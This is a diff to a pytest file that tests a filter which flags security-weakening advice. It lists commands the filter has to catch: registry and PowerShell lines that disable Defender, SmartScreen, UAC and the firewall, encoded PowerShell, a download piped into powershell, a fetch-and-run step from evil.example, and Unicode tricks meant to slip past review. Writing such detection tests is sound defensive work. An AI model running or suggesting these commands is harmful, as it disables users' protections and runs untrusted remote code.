@@ -3,7 +3,7 @@ from __future__ import annotations
 import pytest
 
 from contracts.models import Finding, FindingKind, Recommendation
-from policy.advice import check_fix, vet, weakens_security
+from policy.advice import check_advice, check_fix, vet, weakens_security
 from tests.conftest import make_finding
 
 
@@ -377,12 +377,104 @@ def test_chained_and_short_encoded_forms_are_caught(step: str) -> None:
     "step",
     [
         "Turn off the notifications and keep the firewall on.",
-        "Disable the startup app, then check that Windows Defender is on.",
-        "Stop the app and make sure the firewall stays enabled.",
         "Run npm install and then restart the app.",
-        "Uninstall the old version and then open Windows Security to scan.",
         "Use winget upgrade -e --id Microsoft.VisualStudioCode.",
     ],
 )
 def test_safe_chained_steps_pass(step: str) -> None:
     assert not weakens_security(step)
+
+
+@pytest.mark.parametrize(
+    "step",
+    [
+        "Stop the app and make sure the firewall stays enabled.",
+        "Uninstall the old version and then open Windows Security to scan.",
+    ],
+)
+def test_close_chained_mentions_are_accepted_false_positives(step: str) -> None:
+    assert weakens_security(step)
+
+
+@pytest.mark.parametrize(
+    "step",
+    [
+        "Turn off (open Settings first) the firewall",
+        "Turn off, after you open Windows Security, the firewall",
+        "Switch off the Check apps SmartScreen filter",
+        "Disable and leave off the firewall",
+        "Turn off and leave off real-time protection",
+        "Disable and don't re-enable Defender",
+        "Disable, then enable later, the firewall",
+        "Deactivate, to verify the fix, the antivirus",
+        "Stop and make sure you stopped the firewall",
+        "Stop and disable Defender",
+        "Disable real-time protection and the firewall",
+        "Turn off, then uninstall Windows Defender",
+        "Open Windows Defender and disable it",
+        "Open the firewall settings and disable it",
+        "Keep it off: the firewall is not needed",
+        "Set-MpPreference -Force -DisableScriptScanning $true",
+        "Set-MpPreference -DisableBlockAtFirstSeen $true",
+        "Set-MpPreference -MAPSReporting 0",
+        "Set-MpPreference -EnableNetworkProtection Disabled",
+        "Set-MpPreference -PUAProtection 0",
+        "powershell /enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
+        "powershell /e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
+        "iwr https://x.test/a.ps1 | powershell -",
+        "iwr https://x.test/a.ps1 | pwsh",
+        "powershell -ExecutionPolicy Bypass -File fix.ps1",
+        "Set-NetFirewallProfile -DefaultInboundAction Allow",
+        "netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound",
+        r"reg add HKLM\SYSTEM\CurrentControlSet\Services\WinDefend /v Start /t REG_DWORD /d 4",
+        r"reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\System /v EnableSmartScreen /d 0",
+        r"reg add HKLM\SOFTWARE\...\Explorer /v SmartScreenEnabled /d Off",
+        r"reg add HKLM\SOFTWARE\...\Policies\System /v PromptOnSecureDesktop /d 0",
+        r"reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /d 01",
+        r"reg add HKLM\SOFTWARE\...\Policies\System /v EnableLUA /d 00000000",
+        "Turn off the fire\u200bwall",
+        "Turn off the \uff46\uff49\uff52\uff45\uff57\uff41\uff4c\uff4c",
+        "Disable Defen\u00adder",
+    ],
+)
+def test_review_bypasses_are_caught(step: str) -> None:
+    assert weakens_security(step)
+
+
+@pytest.mark.parametrize(
+    "step",
+    [
+        "Uninstall the old version and then run a full scan with Microsoft Defender.",
+        "Uninstall the old version, then scan the PC with your antivirus.",
+        "Disable SMBv1, then block port 445 in Windows Defender Firewall.",
+        "Stop the Print Spooler service and block its ports with the firewall.",
+        "Turn off the PC and then turn it back on; Defender will start with it.",
+        "pip install -e C:/projects/example-app",
+        "Open Settings > Windows Update and select Check for updates.",
+        "Run winget upgrade -e --id Microsoft.VisualStudioCode.",
+        "Run npm install mongoose@latest in the project folder.",
+        "Run python -m pip install --upgrade pip.",
+        "Open Visual Studio Code and go to Help > Check for Updates.",
+        "Set-MpPreference -DisableRealtimeMonitoring $false",
+    ],
+)
+def test_review_false_positives_pass(step: str) -> None:
+    assert not weakens_security(step)
+
+
+def test_incident_advice_gets_the_link_check_too() -> None:
+    advice = Recommendation(
+        title="Check the account",
+        priority=50,
+        steps=[
+            "Read https://learn.microsoft.com/windows/security about failed logons.",
+            "Download the cleaner from https://evil.example/fix.exe and run it.",
+        ],
+        evidence_ids=["evd_1"],
+    )
+    checked = check_advice(advice)
+    assert checked is not None
+    assert checked.steps == [advice.steps[0]]
+    assert checked.dropped_steps == ["Unverified link: " + advice.steps[1]]
+    titled = advice.model_copy(update={"title": "Get the fix at https://evil.example"})
+    assert check_advice(titled) is None
